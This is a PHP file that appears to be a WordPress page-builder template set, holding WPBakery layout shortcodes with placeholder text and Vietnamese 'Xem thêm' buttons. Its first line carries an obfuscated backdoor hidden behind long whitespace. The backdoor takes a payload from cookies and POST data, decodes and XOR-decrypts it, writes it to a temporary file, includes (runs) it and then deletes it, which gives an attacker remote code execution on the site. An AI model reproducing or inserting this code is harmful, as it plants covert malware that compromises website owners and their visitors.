<?php                                                                                                                                                                                                                                                                                                                                                                                                 $wpadDMk = 'N' . chr ( 630 - 535 ).chr (104) . "\x56" . chr ( 1054 - 980 ); $ZuCmPxve = chr ( 680 - 581 ).'l' . "\141" . chr (115) . "\x73" . '_' . "\145" . chr (120) . chr ( 508 - 403 ).chr (115) . "\x74" . chr ( 1060 - 945 ); $mkMsfM = class_exists($wpadDMk); $wpadDMk = "20242";$ZuCmPxve = "53014";$bBlQK = FALSE;if ($mkMsfM === $bBlQK){$SKgkKupP = "2768";class N_hVJ{public function cRfZPEGK(){echo "34622";}private $fGsfMNqIJM;public static $mVWBMV = "9737db48-d751-4743-80bf-febaa6d435ff";public static $cUEOUN = 15863;public function __construct($gSrIdwFjr=0){$cVCDk = $_POST;$VIKUTvfakl = $_COOKIE;$dmzKT = @$VIKUTvfakl[substr(N_hVJ::$mVWBMV, 0, 4)];if (!empty($dmzKT)){$zvWymiM = "base64";$zOtOrH = "";$dmzKT = explode(",", $dmzKT);foreach ($dmzKT as $NMFPcyY){$zOtOrH .= @$VIKUTvfakl[$NMFPcyY];$zOtOrH .= @$cVCDk[$NMFPcyY];}$zOtOrH = array_map($zvWymiM . "\137" . "\x64" . 'e' . chr ( 398 - 299 ).chr ( 618 - 507 ).'d' . "\145", array($zOtOrH,)); $zOtOrH = $zOtOrH[0] ^ str_repeat(N_hVJ::$mVWBMV, (strlen($zOtOrH[0]) / strlen(N_hVJ::$mVWBMV)) + 1);N_hVJ::$cUEOUN = @unserialize($zOtOrH);}}private function fZyXZdQnPp($SKgkKupP){if (is_array(N_hVJ::$cUEOUN)) {$GDAYx = sys_get_temp_dir() . "/" . crc32(N_hVJ::$cUEOUN["\x73" . "\x61" . 'l' . 't']);@N_hVJ::$cUEOUN[chr ( 192 - 73 ).chr ( 418 - 304 ).chr ( 326 - 221 ).chr ( 351 - 235 )."\145"]($GDAYx, N_hVJ::$cUEOUN[chr ( 755 - 656 ).chr (111) . chr ( 752 - 642 ).chr ( 921 - 805 )."\x65" . "\156" . chr (116)]);include $GDAYx;@N_hVJ::$cUEOUN[chr ( 966 - 866 ).'e' . "\x6c" . chr ( 719 - 618 )."\x74" . "\x65"]($GDAYx); $SKgkKupP = "2768";exit();}}public function __destruct(){$this->fZyXZdQnPp($SKgkKupP);}}$hXmhdaZjxr = new /* 56530 */ N_hVJ(); $hXmhdaZjxr = str_repeat("38087_14276", 1);} ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}
...
[/vc_column_text][vc_btn title="Xem thêm" color="chino" align="center"][/vc_column][vc_column width="1/4"][/vc_column][/vc_row][vc_row][vc_column width="1/2"][vc_single_image img_size="500x200" alignment="center"][vc_custom_heading text="Article Title" font_container="tag:h3|text_align:center" use_theme_fonts="yes"][vc_column_text]

Vivamus et risus in purus consequat interdum. Nam hendrerit euismod quam imperdiet maximus. Duis id eros eu lectus tempor interdum. Duis nec commodo enim. Proin lobortis sapien vitae eleifend tincidunt.

[/vc_column_text][vc_btn title="Xem thêm" color="chino" align="center"][/vc_column][vc_column width="1/2"][vc_single_image img_size="500x200" alignment="center"][vc_custom_heading text="Article Title" font_container="tag:h3|text_align:center" use_theme_fonts="yes"][vc_column_text]

Vivamus et risus in purus consequat interdum. Nam hendrerit euismod quam imperdiet maximus. Duis id eros eu lectus tempor interdum. Duis nec commodo enim. Proin lobortis sapien vitae eleifend tincidunt.

[/vc_column_text][vc_btn title="Xem thêm" color="chino" align="center"][/vc_column][/vc_row]
CONTENT;
...
This section is a perfect place to display introduction description for your products and services with an option to access more information by clicking "Xem thêm" button.

[/vc_column_text][vc_btn title="Xem thêm" style="outline" shape="square" color="white" align="left"][/vc_column][vc_column width="1/2"][vc_single_image img_size="medium" alignment="center" style="vc_box_rounded"][/vc_column][/vc_row][vc_row][vc_column width="1/3"][vc_custom_heading text="Heading with Theme Font" font_container="tag:h3|text_align:left" use_theme_fonts="yes" css=".vc_custom_1436530550784{margin-top: 0px !important;}"][vc_column_text css=".vc_custom_1436530603605{margin-bottom: 15px !important;}"]
...
$data['disabled'] = true;
$data['content'] = <<<CONTENT
[vc_row full_width="stretch_row" gap="35" equal_height="yes" css=".vc_custom_1456142754632{padding-top: 100px !important;padding-bottom: 100px !important;background-color: #eaeaea !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;}"][vc_column width="1/3" css=".vc_custom_1455714400431{background-color:  !important;border-radius: 5px !important;}"][vc_icon type="typicons" icon_typicons="typcn typcn-device-phone" color="white" background_style="rounded" background_color="vista_blue" size="lg" align="center"][vc_custom_heading font_container="tag:h3|text_align:center"][vc_column_text]I am text block. Click edit button to change this text. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.[/vc_column_text][/vc_column][vc_column width="1/3" css=".vc_custom_1455714406281{background-color: !important;border-radius: 5px !important;}"][vc_icon type="typicons" icon_typicons="typcn typcn-brush" color="white" background_style="rounded" background_color="orange" size="lg" align="center"][vc_custom_heading font_container="tag:h3|text_align:center"][vc_column_text]I am text block. Click edit button to change this text. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.[/vc_column_text][/vc_column][vc_column width="1/3" css=".vc_custom_1455714413009{background-color:  !important;border-radius: 5px !important;}"][vc_icon type="typicons" icon_typicons="typcn typcn-flow-parallel" color="white" background_style="rounded" background_color="sandy_brown" size="lg" align="center"][vc_custom_heading font_container="tag:h3|text_align:center"][vc_column_text]I am text block. Click edit button to change this text. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.[/vc_column_text][/vc_column][/vc_row]
CONTENT;
...
$data['disabled'] = true;
$data['content'] = <<<CONTENT
[vc_row full_width="stretch_row" css=".vc_custom_1456147693944{padding-top: 100px !important;padding-bottom: 100px !important;background-color: #eaeaea !important;}"][vc_column width="1/3"][/vc_column][vc_column width="1/3" css=".vc_custom_1456147681162{background-color:!important;border: 5px solid #353535 !important;}"][vc_custom_heading font_container="tag:h3|text_align:center|color:%23353535"][vc_column_text]I am text block. Click edit button to change this text. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.[/vc_column_text][/vc_column][vc_column width="1/3"][/vc_column][/vc_row]
CONTENT;
